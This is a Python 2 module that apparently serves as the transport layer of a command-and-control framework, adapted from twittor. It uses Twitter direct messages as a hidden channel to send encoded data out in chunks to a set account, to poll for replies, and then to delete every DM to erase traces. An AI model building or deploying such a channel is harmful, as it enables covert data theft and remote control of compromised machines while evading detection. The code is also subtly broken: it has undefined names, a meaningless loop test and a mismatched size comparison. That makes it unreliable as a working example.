# Sample transport that utilizes twitter as a communication channel.
# Most of the code is borrowed with love from https://github.com/PaulSec/twittor/

# TODO, consider if we need to delete DMs or not.

import tweepy
import struct
from time import sleep

# GHETTO CONFIG SECTION, TO BE EVENTUALLY UPDATED WHEN CONFIG READING IS PATCHED IN

CONSUMER_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
CONSUMER_SECRET = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'

ACCESS_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
ACCESS_TOKEN_SECRET = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'

USERNAME = 'XXXXXXXXXXXXXXXXXXXXXXXX'

def prepTransport():
	global api

	auth = tweepy.OAuthHandler(CONSUMER_TOKEN, CONSUMER_SECRET)
	auth.set_access_token(ACCESS_TOKEN, ACCESS_TOKEN_SECRET)

	# Construct the api instance
	api = tweepy.API(auth)



def sendData(data):
	encoded_data = encode(data)
	api.send_direct_message(user=USERNAME, text=len(data))
	if len(encoded_data) > 10000:
		dataArray = [encoded_data[i:i + 6000] for i in range(0, len(encoded_data), 6000)]
		for chunk in dataArray:
			api.send_direct_message(user=USERNAME, text=chunk)
			sleep(0.1)
	else:
		api.send_direct_message(user=USERNAME, text=encoded_data)


def retrieveData():
	data = ""
	dataSize = None
	while (dataSize is None):
		try:
			dataSize = api.direct_messages(count=1, full_text="true")[0]
		except IndexError:
			sleep(5)
	while not (dataSize.text, int):
		sleep(5)
		dataSize = api.direct_messages(count=1, full_text="true")[0]
	# for message in api.direct_messages(count=1000, full_text="true"):
	while (len(data) != dataSize):
		for message in api.direct_messages(count=1000, full_text="true", since_id=dataSize.id):
			if (message.sender_screen_name == USERNAME):
				try:
					data += message.text
					bufSize += len(data)
				except:
					pass
	deleteDirectMessages()
	return data

def deleteDirectMessages():
	dlist = api.direct_messages()
	if len(dlist) >= 1:
		for d in dlist:
			d.destroy()
	print "DMs destroyed"
